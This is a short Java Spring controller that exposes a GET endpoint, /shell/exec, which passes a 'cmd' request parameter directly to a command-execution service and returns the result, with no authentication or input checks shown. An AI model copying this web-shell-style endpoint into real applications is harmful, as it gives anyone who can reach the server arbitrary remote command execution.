package com.qkforex.shell.controller;

import com.qkforex.shell.service.CommandService;
import org.springframework.beans.factory.annotation.Autowired;
import org.springframework.web.bind.annotation.*;

@RestController
@RequestMapping(value = "/shell",method = {RequestMethod.GET})
public class CommandController {

    @Autowired
    private CommandService commandService;

    @RequestMapping(value="/exec",method = {RequestMethod.GET})
    @ResponseBody
    public String exec(@RequestParam("cmd")String[] cmd)
    {
        return commandService.exec(cmd);
        //return null;
    }
}
